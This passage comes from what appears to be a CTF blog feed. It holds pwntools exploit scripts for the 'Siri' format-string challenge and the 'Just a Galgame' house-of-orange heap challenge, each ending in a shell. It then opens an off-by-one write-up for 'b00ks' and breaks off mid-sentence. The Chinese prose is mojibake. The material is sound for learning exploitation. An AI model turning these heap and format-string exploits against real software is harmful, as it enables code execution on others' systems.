class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">"./Siri"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.I:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> args.R:</span><br><span class="line">    p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">12124</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">"./Siri"</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Hey Siri!"</span>)</span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Remind me to %&#123;&#125;$p"</span>.format(<span class="number">0x4d</span>+<span class="number">6</span>))</span><br><span class="line">p.recvuntil(<span class="string">"OK, I'll remind you to "</span>)</span><br><span class="line">base = int(p.recvline().strip(), <span class="number">16</span>) - libc.symbols[<span class="string">'__libc_start_main'</span>] - <span class="number">231</span></span><br><span class="line"></span><br><span class="line">one_gadget = base + <span class="number">0x4f365</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Hey Siri!"</span>)</span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Remind me to %46$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"OK, I'll remind you to "</span>)</span><br><span class="line">stack = int(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr, val)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Hey Siri!"</span>)</span><br><span class="line">    payload = <span class="string">b"Remind me to "</span></span><br><span class="line">    num = val + <span class="number">256</span> - <span class="number">28</span></span><br><span class="line">    payload += <span class="string">'%&#123;&#125;cA'</span>.format(num).encode() <span class="comment"># 6</span></span><br><span class="line">    payload += <span class="string">b'%15$hhn'</span></span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>, payload)</span><br><span class="line">    p.recvuntil(<span class="string">"OK, I'll remind you to "</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    num = (one_gadget &gt;&gt; (i*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    write(stack+<span class="number">8</span>+i, num)</span><br><span class="line">pause()</span><br><span class="line">leave_ret = <span class="number">0xC1</span></span><br><span class="line">write(stack<span class="number">-280</span>, leave_ret)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="just-a-galgame"><a href="#just-a-galgame" class="headerlink" title="just a galgame"></a>just a galgame</h2><p>ä¸å¾—ä¸è¯´ï¼Œè¿™é“é¢˜çš„åœºæ™¯å‡ºçš„ç‰¹åˆ«æœ‰æ„æ€ï¼Œå¾ˆå¤šåœ°æ–¹çš„é™åˆ¶è¿˜åŸäº†çœŸå®çš„galgameï¼ˆ&gt;_&lt;æ­»å®…çœŸæ¶å¿ƒ~ï¼‰ã€‚</p><p>ç®€å•è¯´ä¸€ä¸‹åŠŸèƒ½ï¼Œé€ç¤¼ç‰©èƒ½malloc(0x68)ï¼Œæœ€å¤šèƒ½åˆ†é…7æ¬¡ï¼Œå»çœ‹ç”µå½±èƒ½åšä¸€ä¸ªå †æº¢å‡ºä¿®æ”¹ï¼Œåˆšå¼€å§‹åªæœ‰ä¸€æ¬¡ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œå®Œè¡¨ç™½ä¹‹åèƒ½åœ¨è·å¾—ä¸€æ¬¡ä¿®æ”¹æœºä¼šï¼Œè¡¨ç™½æ˜¯ç”³è¯·ä¸€ä¸ª0x1000é•¿åº¦çš„chunkï¼ŒæŸ¥çœ‹CGèƒ½è¾“å‡ºæŒ‡é’ˆå†…å®¹çš„ä¿¡æ¯ï¼Œæœ€åæ˜¯é€€å‡ºåŠŸèƒ½ï¼Œä¹Ÿèƒ½å†™ä¸€ä¸ªbssæ®µä¸Šæ•°æ®ã€‚</p><p>è¿™é“é¢˜æœ€æ˜æ˜¾çš„ç‰¹å¾å°±æ˜¯æ²¡æœ‰freeçš„åŠŸèƒ½ï¼Œå¯ä»¥è”æƒ³åˆ°<code>house of orange</code>ï¼Œè¿™ç§åˆ©ç”¨æŠ€å·§èƒ½åœ¨æ²¡æœ‰freeçš„æƒ…å†µä¸‹æŠŠç¼©å°è¿‡åçš„<code>top chunk</code>æ”¾è¿›<code>unsorted bin</code>ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å†æ¬¡åˆ†é…chunkçš„æ—¶å€™ä¼šä»<code>unsorted bin</code>ä¸­è·å–ï¼Œå¦‚æœåˆ†é…ä¹‹åæ²¡æœ‰å†™å…¥å•¥çš„ï¼Œå°±å¯ä»¥æ³„éœ²å‡ºlibcåœ°å€ã€‚</p><h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><p>è¿™ç§åˆ©ç”¨æŠ€å·§éœ€è¦å †æº¢å‡ºèƒ½å¤Ÿè¦†ç›–åˆ°<code>top chunk</code>çš„sizeéƒ¨åˆ†ï¼Œè®©å®ƒç¼©å°ï¼Œå†ç”³è¯·ä¸€ä¸ªæ¯”å®ƒsizeæ›´å¤§çš„chunkï¼Œè®©è¿™ä¸ª<code>top chunk</code>è¿›å…¥<code>unsorted bin</code>ä¸­ï¼Œéšåå †ç®¡ç†å™¨ä¼šæ‰©å¤§å †çš„å¤§å°åˆ†é…ä¸€ä¸ªæ–°çš„<code>top chunk</code>ã€‚</p><p>åœ¨è¿™é“é¢˜ä¸­ï¼Œæˆ‘ä»¬å…ˆç”³è¯·ä¸€ä¸ªchunkï¼Œç”¨åšæº¢å‡º<code>top chunk</code>ï¼Œéšååˆ©ç”¨çœ‹ç”µå½±çš„åŠŸèƒ½å®ƒèƒ½æº¢å‡ºåˆ°sizeåŒºåŸŸï¼Œç”±äº<code>top chunk</code>éœ€è¦é¡µå¯¹é½ï¼Œæ‰€ä»¥å®ƒçš„chunkç»“æŸå¤„æœ«å°¾çš„åœ°å€å¿…é¡»ä¸º000ã€‚ç”±äºå¤§chunkçš„ç”³è¯·å¤§å°ä¸º0x1000ï¼Œç›´æ¥ä¿ç•™æœ€åä¸‰ä½å°±èƒ½æ»¡è¶³æ¡ä»¶ï¼Œè¿™é‡Œçš„ä¼ªé€ sizeä¸º0xd41ã€‚æœ€åæ‰§è¡Œè¡¨ç™½åŠŸèƒ½ï¼Œç”³è¯·å¤§chunkï¼Œç”±äº<code>top chunk</code>çš„å¤§å°ä¸æ»¡è¶³ç”³è¯·å¤§å°ï¼Œä¹Ÿæ²¡æœ‰å…¶ä»–åœ°æ–¹èƒ½å¤Ÿæ»¡è¶³ï¼Œæœ€ç»ˆå †ç®¡ç†å™¨ä¼šæŠŠ<code>top chunk</code>åŠ å…¥<code>unsorted bin</code>ä¸­ï¼ŒåŒæ—¶æ‰©å¤§å †çš„èŒƒå›´è·å¾—æ–°çš„å †ç©ºé—´ã€‚</p><p>è¿™æ—¶ï¼Œæˆ‘ä»¬å†æ¬¡ç”³è¯·0x68å¤§å°çš„chunkï¼Œæ ¹æ®åˆ†é…è§„åˆ™ä¼šä»<code>unsorted bin</code>ä¸­è¿›è¡Œåˆ‡åˆ†ï¼Œæˆ‘ä»¬æ‹¿åˆ°çš„chunkä¹‹åè°ƒç”¨è¾“å‡ºåŠŸèƒ½ï¼Œä¼šæŠŠchunkä¸­çš„æ•°æ®éƒ¨åˆ†æ‰“å°å‡ºæ¥ï¼Œè¿™é‡Œå› ä¸ºåˆ†é…ä¹‹åä¸ä¼šå¯¹chunkåšåˆå§‹åŒ–æˆ–è€…å†™å…¥æ•°æ®æ“ä½œï¼Œèƒ½å¤Ÿæ³„éœ²å‡ºlibcåœ°å€ã€‚</p><h3 id="å†™one-gadget"><a href="#å†™one-gadget" class="headerlink" title="å†™one_gadget"></a>å†™one_gadget</h3><img src="/2020/09/15/2020qwb-qwxf-pwn/5.png"><p>è¿™é‡Œè¦ç”¨åˆ°å¦å¤–ä¸€ä¸ªæ¼æ´ç‚¹äº†ï¼Œåœ¨çœ‹ç”µå½±åŠŸèƒ½ä¸­ä¼šæœ‰ä¸€ä¸ªåœ¨æŒ‡é’ˆå‡½æ•°ä¸­é€‰æ‹©æŒ‡é’ˆçš„è¿‡ç¨‹ï¼Œè€Œè¿™ä¸ªä¸‹æ ‡æ²¡æœ‰è¢«é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¶Šç•Œå†™æ•°æ®ï¼Œå‰ææ˜¯è¶Šç•Œçš„åœ°æ–¹æ˜¯æœ‰å­˜æ”¾æ•°æ®çš„ã€‚æ­£å¥½ï¼Œåœ¨æŒ‡é’ˆæ•°ç»„çš„ä¸‹æ–¹å°±æœ‰ä¸€ä¸ªå…¨å±€çš„å˜é‡ï¼ŒåŒæ—¶ä¹Ÿæœ‰åŠŸèƒ½èƒ½å†™å…¥æ•°æ®ï¼Œè¿™æ ·å†™å…¥æˆ‘ä»¬éœ€è¦çš„åœ°å€ï¼Œé€šè¿‡è¶Šç•Œè®¿é—®çš„æ–¹å¼æ‹¿åˆ°åœ°å€ï¼Œå¯ä»¥å‘ä»»æ„åœ°å€å†™å…¥0x10å­—èŠ‚çš„å†…å®¹ã€‚</p><p>å‰©ä¸‹çš„å°±æ˜¯ç›®æ ‡é€‰æ‹©ï¼Œè¿™é‡Œæ²¡æœ‰freeï¼Œæ‰€ä»¥é€‰æ‹©<code>__malloc_hook</code>ï¼Œå‘å…¶ä¸­å†™å…¥one_gadgetï¼Œå†æ¬¡åˆ†é…å³å¯è§¦å‘æ‹¿åˆ°shellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># author: hurricane618</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./Just_a_Galgame'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'D'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'R'</span>]:</span><br><span class="line">    io = remote(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">'./Just_a_Galgame'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movie</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'idx &gt;&gt; '</span>, str(index))</span><br><span class="line">    io.sendafter(<span class="string">'movie name &gt;&gt; '</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">confess</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collection</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">(data)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'5'</span>)</span><br><span class="line">    io.sendafter(<span class="string">'QAQ'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gift()  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">movie(<span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xd41</span>))</span><br><span class="line">pause()</span><br><span class="line">confess()  <span class="comment"># malloc 0x1000</span></span><br><span class="line">pause()</span><br><span class="line">gift()  <span class="comment"># 1</span></span><br><span class="line">collection()  <span class="comment"># leak libc</span></span><br><span class="line"></span><br><span class="line">leak_addr = u64(io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_addr = leak_addr - <span class="number">0x3ec2a0</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">'libc_addr: '</span> + hex(libc_addr))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_addr</span><br><span class="line"></span><br><span class="line">exit(p64(malloc_hook - <span class="number">0x60</span>))</span><br><span class="line">pause()</span><br><span class="line">movie(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line">gift()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å—åˆ°æ‘¸é±¼å’Œå„ç§é¡¹ç›®å‹åŠ›ä¹‹åï¼Œç»ˆäºå‘å‡ºæ¥äº†ï¼Œè¿™æ¬¡æ˜¯å¼ºç½‘æ¯ä¸­å¼ºç½‘å…ˆé”‹çš„4é“pwné¢˜ï¼Œå‰©ä¸‹çš„pwné¢˜è¿˜åœ¨é™†ç»­å¤ç°ingï¼Œåœ¨åšäº†åœ¨åšäº†ing&lt;/p&gt;
&lt;h2 id=&quot;babymessage&quot;&gt;&lt;a href=&quot;#babymessage&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="stackoverflow" scheme="https://hurricane618.me/tags/stackoverflow/"/>
    
      <category term="heap" scheme="https://hurricane618.me/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>glibcå †åˆ©ç”¨ä¹‹off by oneçš„ä¸¤é“CTFé¢˜ç›®</title>
    <link href="https://hurricane618.me/2020/08/07/glibc-pwn-off-by-one-1/"/>
    <id>https://hurricane618.me/2020/08/07/glibc-pwn-off-by-one-1/</id>
    <published>2020-08-07T13:32:14.000Z</published>
    <updated>2020-08-07T13:32:14.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="b00ks"><a href="#b00ks" class="headerlink" title="b00ks"></a>b00ks</h2><p>è¿™æ˜¯ä¸€é“asis ctf 2016çš„é¢˜ç›®ï¼Œä¸»è¦åŠŸèƒ½æ˜¯ä¹¦æœ¬è®°å½•ï¼Œé™¤äº†åŸºæœ¬çš„ä¹¦æœ¬çš„å¢åˆ æ”¹æŸ¥åŠŸèƒ½ï¼Œè¿˜æœ‰ä¸€ä¸ªä½œè€…åç§°çš„æ”¹å˜ã€‚ç¨‹åºæ˜¯ä¸€ä¸ªåŸºæœ¬ä¿æŠ¤é™¤äº†canaryå…¶ä»–å…¨å¼€çš„64ä½ç¨‹åºã€‚</p><p>è°ƒè¯•å†™expçš„è¿‡ç¨‹å‚è€ƒäº†ctf-wikiï¼Œ<a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">å…ˆçŸ¥ç¤¾åŒºä¸€ç¯‡æ–‡ç« </a>ï¼Œå’Œ<a href="https://cq674350529.github.io/2018/06/05/asis-ctf-2016-pwn-b00ks/" target="_blank" rel="noopener">å¦å¤–ä¸€ä¸ªåšå®¢</a>ã€‚å¾ˆå¤šç»†èŠ‚ä¸Šé¢çš„æ–‡ç« å·²ç»å†™çš„å¾ˆè¯¦ç»†äº†ï¼Œæˆ‘è¡¥å……ä¸€äº›å…¶ä»–ç»†èŠ‚ç‚¹ã€‚</p><p>è¿™é‡Œæ¼æ´çš„é—®é¢˜æ˜¯å‡ºç°åœ¨ç¨‹åºè‡ªå®šä¹‰çš„è¯»å–å‡½æ•°ä¸­ï¼Œåœ¨è¯»å®Œè§„å®šé•¿åº¦çš„æ•°æ®ä¹‹ååˆä¼šåœ¨æœ«å°¾å¡«ä¸€ä¸ª0ï¼Œè¿™æ ·å°±ä¼šæº¢å‡ºä¸€ä¸ªç©ºå­—èŠ‚ã€‚è¿™ç§æ¼æ´è¢«ç§°ä¸ºOBOï¼ˆoff by oneï¼‰ï¼Œè¿™é‡Œä¸€å…±ä½¿ç”¨äº†ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡æ˜¯å…ˆæŠŠä½œè€…nameå…¨éƒ¨å¡«æ»¡ï¼Œè¿™æ ·æº¢å‡ºçš„0å­—èŠ‚å°±åœ¨ä¸‹ä¸€ä¸ªåŒºåŸŸä¸­ï¼Œéšåè¿™ä¸ªç¨‹åºæœ‰ä¸€ä¸ªç®¡ç†å…¨å±€ä¹¦æœ¬çš„æŒ‡é’ˆæ•°ç»„å†™åœ¨è¿™ä¸ªnameåé¢ï¼Œè¿™ä¸ªæ“ä½œä¼šè¦†ç›–æ‰é‚£ä¸ªæº¢å‡ºçš„0å­—èŠ‚ï¼Œæ°å·§è¿™ä¸ªnameä¼šè¢«å½“åšå­—ç¬¦ä¸²è¾“å‡ºè¿™æ ·åé¢çš„æŒ‡é’ˆå°±è¢«æ³„éœ²ï¼›ç¬¬äºŒæ¬¡æ˜¯åœ¨nameåé¢æœ‰æŒ‡é’ˆæ•°ç»„çš„æƒ…å†µä¸‹æˆ‘ä»¬ç»§ç»­é‡å¤å¡«å……æ»¡nameå­—æ®µï¼Œè¿™æ ·0å­—èŠ‚å°±ä¼šè¦†ç›–æŒ‡é’ˆæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆçš„æœ€ä½ä½ï¼Œæ”¹å˜æŒ‡é’ˆæŒ‡å‘çš„åœ°å€ï¼Œä½¿å¾—æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„æ•°æ®ç»“æ„ã€‚</p><p>æ‰€ä»¥ï¼Œoboæ¼æ´å¯ä»¥åšåˆ°ï¼š</p><ol><li>å¦‚æœè¯¥æ¼æ´åé¢æœ‰æ•°æ®å†™å…¥ï¼Œæœ‰å¯èƒ½æ³„éœ²æ•°æ®</li><li>å¯ä»¥é€šè¿‡æº¢å‡ºä¸€ä¸ªå­—èŠ‚æ”¹å˜æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®ï¼Œè®©å®ƒæŒ‡å‘ä¼ªé€ çš„æ•°æ®ã€‚å¦‚æœåœ¨nameåé¢çš„æ˜¯å…¶ä»–é‡è¦çš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥è¦†ç›–è¾¾åˆ°ä¸€äº›å…¶ä»–æ•ˆæœ</li></ol><p>è¿™é‡Œä¼ªé€ æ•°æ®ç»“æ„æ˜¯ç¬¬äºŒä¸ªéš¾ç‚¹ï¼Œå¦‚æœæˆ‘ä»¬åœ¨åˆ†é…ç©ºé—´çš„æ—¶å€™å¤ªå°ï¼Œæœ‰å¯èƒ½åœ¨è¦†ç›–æˆ0å­—èŠ‚ä¹‹åè¶…è¿‡äº†æˆ‘ä»¬èƒ½å†™å…¥çš„èŒƒå›´ï¼Œæ‰€ä»¥åœ¨åˆ†é…çš„æ—¶å€™å°½é‡å¤§ä¸€ç‚¹ã€‚åˆ›å»ºä¹¦æœ¬çš„è¿‡ç¨‹ä¼šå…ˆåˆ›å»ºbook_nameï¼Œéšåæ˜¯book_descriptionï¼Œæœ€åæ˜¯åˆ›å»ºä¹¦æœ¬çš„æ•°æ®ç»“æ„ã€‚ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> book_id</span><br><span class="line">    <span class="keyword">char</span>* book_name</span><br><span class="line">    <span class="keyword">char</span>* book_description</span><br><span class="line">    <span class="keyword">int</span> book_size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç»“æ„çš„æŒ‡é’ˆä¼šè¢«å†™å…¥nameåé¢çš„æŒ‡é’ˆæ•°ç»„ä¸­ã€‚æˆ‘ä»¬èƒ½æ”¹å˜çš„åªæœ‰descriptionéƒ¨åˆ†ï¼Œåœ¨æˆ‘ä»¬è¦†ç›–æŒ‡é’ˆæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆæœ«å°¾çš„0å­—èŠ‚ä¹‹åï¼Œè®©å…¶æŒ‡å‘descriptionåŒºåŸŸï¼Œæˆ‘ä»¬åœ¨å…¶ä¸­å°±å¯ä»¥ä¼ªé€ ç»“æ„ï¼Œè®©é‚£ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æƒ³è¦è¯»/å†™çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»»æ„è¯»å†™ã€‚</p><p>è¿™é‡Œçš„descriptionçš„åç§»éœ€è¦è‡ªå·±è°ƒè¯•æ¥è®¡ç®—ï¼Œå¦‚æœæ˜¯åœ¨çœŸå®ç¯å¢ƒä¸‹ï¼Œå¯èƒ½éœ€è¦å¾ªç¯å¤šè¯•å¾ˆå¤šæ¬¡ã€‚</p><p>ç”±äºå¼€å¯äº†FULL RELROï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹gotè¡¨ï¼Œæ‰€ä»¥è¿™é‡Œæƒ³åˆ°çš„æ–¹æ³•æ˜¯æ”¹å†™<code>__free_hook</code>æˆ–<code>__malloc_hook</code>ã€‚ä½†æ˜¯æ”¹å†™è¿™ä¸ªå°±éœ€è¦libcçš„åœ°å€ï¼Œæˆ‘ä»¬æ€ä¹ˆæåˆ°å‘¢ï¼Ÿå…¶å®æˆ‘ä»¬åœ¨æœ‰ä»»æ„è¯»å†™çš„æ—¶å€™ï¼Œåˆ›å»ºä¸€ä¸ªå¾ˆå¤§çš„book2ï¼Œè¿™æ ·åˆ†é…å†…å­˜çš„æ—¶å€™å°±ä¼šä½¿ç”¨mmapçš„æ–¹å¼ï¼Œè¯»å–åˆ°è¿™ä¸ªåœ°å€å»è®¡ç®—ä¸libcåŸºåœ°å€çš„offsetï¼Œä¹‹åå®é™…ä¸­æ‹¿åˆ°åœ°å€å‡å»è¿™ä¸ªoffsetå°±æ˜¯libcåŸºåœ°å€ã€‚</p><p>æœ€åï¼Œæ‹¿åˆ°<code>__free_hook</code>çš„åœ°å€è¦†ç›–book2çš„descriptionæŒ‡é’ˆï¼Œä¹‹åå†å¯¹book2çš„descriptionå†™å…¥æˆ‘ä»¬çš„one-gadgetï¼Œè¿™æ ·ä¸€æ—¦å‡ºç°freeï¼Œæ£€æŸ¥åˆ°<code>__free_hook</code>ä¸ä¸ºç©ºï¼Œå°±ä¼šæ‰§è¡Œè§¦å‘getshellã€‚</p><h3 id="å¦å¤–çš„æ–¹æ³•"><a href="#å¦å¤–çš„æ–¹æ³•" class="headerlink" title="å¦å¤–çš„æ–¹æ³•"></a>å¦å¤–çš„æ–¹æ³•</h3><p>è¿™é‡Œå¦å¤–çš„æ–¹æ³•å°±æ˜¯unlinkï¼Œè¿™é‡Œçš„off-by-oneçš„æ¼æ´å¾ˆç¥å¥‡ï¼Œä¸ä»…ä»…æ˜¯åœ¨æ”¹åå­—é‚£é‡Œæœ‰ï¼Œåœ¨ä¿®æ”¹bookæè¿°çš„åœ°æ–¹ä¹Ÿæœ‰1å­—èŠ‚çš„æº¢å‡ºï¼Œåªæ˜¯ä¸¤ç§æº¢å‡ºçš„æ–¹å¼è§¦å‘ä¸å¤ªä¸€æ ·ã€‚</p><img src="/2020/08/07/glibc-pwn-off-by-one-1/1.png"><p>åœ¨æ”¹åå­—é‚£é‡Œå› ä¸ºç»™å…¥çš„æ˜¯32ï¼Œæ‰€ä»¥a2ä¸º32ï¼Œæœ€åé€€å‡ºæ˜¯å¾ªç¯æ˜¯å› ä¸ºå›è½¦ï¼Œè€Œæ”¹bookæè¿°é‚£é‡Œæ˜¯å› ä¸ºç»™å®šçš„è¾“å…¥ä¸º<code>é•¿åº¦-1</code>ï¼Œæœ€åå¤šå†™ä¸€ä¸ªå­—èŠ‚æ˜¯å› ä¸ºé•¿åº¦åˆ°äº†ã€‚</p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯è®©ä¸€ä¸ªbookçš„æè¿°éƒ¨åˆ†ä¼ªé€ å‡ºä¸€ä¸ªchunkï¼ŒåŒæ—¶æº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œè®©ä¸‹é¢çš„æè¿°chunkéƒ¨åˆ†çš„sizeæœ€ä½å­—èŠ‚ä¸º0ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨freeä¸‹é¢çš„chunkæ—¶ï¼Œä¼šå’Œä¸Šé¢çš„ä¼ªé€ åŒºå—åˆå¹¶ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šè§¦å‘unlinkï¼Œä¿®æ”¹ä¸€ä¸ªæŒ‡å®šæŒ‡é’ˆã€‚è¿™ä¸ªæŒ‡å®šæŒ‡é’ˆæˆ‘ä»¬é€‰çš„æ˜¯book4çš„æè¿°æŒ‡é’ˆï¼Œè¿™æ 